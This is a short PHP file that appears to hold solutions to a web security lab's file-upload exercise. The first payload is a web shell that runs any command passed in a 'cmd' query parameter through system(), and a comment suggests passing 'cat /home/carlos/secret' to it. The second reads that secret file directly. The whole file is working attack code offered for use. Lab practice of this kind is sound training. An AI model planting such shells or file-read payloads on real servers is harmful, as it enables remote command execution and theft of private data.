<!-- Solution 1 - then access file with cat /home/carlos/secret as cmd query param -->
</br> CMD </br>
<?php echo system($_GET['cmd']); ?>
</br>

<!-- Solution 2 -->
</br> READ </br>
<?php echo file_get_contents('/home/carlos/secret'); ?>
</br> 